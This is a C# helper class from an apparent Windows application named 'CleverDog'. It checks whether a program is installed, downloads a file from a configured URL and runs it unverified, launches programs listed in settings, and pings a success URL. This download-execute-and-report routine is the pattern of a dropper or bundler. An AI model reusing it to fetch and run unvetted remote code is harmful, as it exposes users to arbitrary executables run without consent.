using Oreo.CleverDog.Commons;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using Y.Utils.AppUtils;
using Y.Utils.DataUtils.Collections;
using Y.Utils.DataUtils.EncryptUtils;
using Y.Utils.NetUtils.HttpUtils;
using Y.Utils.WindowsUtils.InfoUtils;
using Y.Utils.WindowsUtils.ProcessUtils;

namespace Oreo.CleverDog.Helpers
{
    public class FrisbeeHelper
    {
        public static bool IsSoftExist()
        {
            if (SoftwareTool.ExistFile(Settings.Frisbee.ExistFile) ||
                SoftwareTool.ExistProcess(Settings.Frisbee.ExistProcess) ||
                SoftwareTool.ExistControl(Settings.Frisbee.ExistSetup))
            {
                return true;
            }
            return false;
        }
        public static bool DownFileAndRun()
        {
            string downfile = R.Paths.App + Settings.Frisbee.UrlFileName;
            if (HttpTool.Download(Settings.Frisbee.Url, downfile))
            {
                if (File.Exists(downfile))
                    ProcessTool.StartProcess(downfile);
                return true;
            }
            return false;
        }
        public static void RunOtherApp()
        {
            if (!ListTool.IsNullOrEmpty(Settings.Frisbee.Run))
            {
                foreach (var r in Settings.Frisbee.Run)
                {
                    if (!string.IsNullOrWhiteSpace(r))
                    {
                        ProcessTool.StartProcess(r);
                    }
                }
            }
        }
        public static void SuccGetUrl()
        {
            HttpTool.Get(Settings.Frisbee.SuccGetUrl);
        }

    }
}
